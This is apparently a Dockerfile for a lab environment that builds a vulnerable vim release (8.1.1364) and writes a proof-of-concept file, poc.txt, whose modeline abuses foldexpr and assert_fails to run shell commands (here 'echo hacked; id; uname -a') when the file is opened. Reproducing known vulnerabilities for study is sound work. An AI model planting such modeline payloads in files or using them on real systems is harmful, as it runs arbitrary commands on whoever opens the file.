FROM ubuntu:20.04
ENV LC_CTYPE C.UTF-8
ARG DEBIAN_FRONTEND=noninteractive
RUN apt update && apt install -yq gcc make wget curl git gdb clang llvm \
	python3 python3-pip bsdmainutils
# go into lower user
RUN useradd -ms /bin/bash user
RUN cd /root/ && wget \ 
	https://github.com/vim/vim/archive/refs/tags/v8.1.1364.tar.gz \
	&& tar xvzf v8.1.1364.tar.gz
RUN cd /root/vim-8.1.1364/ && make && make install
USER user
WORKDIR /home/user
RUN mkdir /home/user/exploit/ && cd /home/user/exploit/ && \
	echo ':!echo hacked; id; uname -a||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="' > poc.txt
